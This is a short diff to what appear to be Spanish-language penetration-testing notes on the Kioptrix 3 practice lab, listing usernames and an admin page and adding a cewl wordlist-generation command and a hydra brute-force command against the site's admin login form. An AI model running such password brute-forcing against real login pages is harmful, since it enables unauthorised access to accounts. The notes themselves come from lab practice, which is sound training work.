@@ -30,3 +30,6 @@ http://kioptrix3.com/gallery
 loneferret o loneferret!
 gadmin gadmin.php
 
+Probamos bruteforce sin éxito
+cewl -w DICC-KIOPT.txt --with-numbers -a -e -d 5 -v http://kioptrix3.com/
+hydra -l loneferret -P DICC-KIOPT.txt -s 80 -f -t 5 -vV kioptrix3.com http-post-form "/index.php?system=Admin&page=loginSubmit:username=^USER^&password=^PASS^:Incorrect username or password"
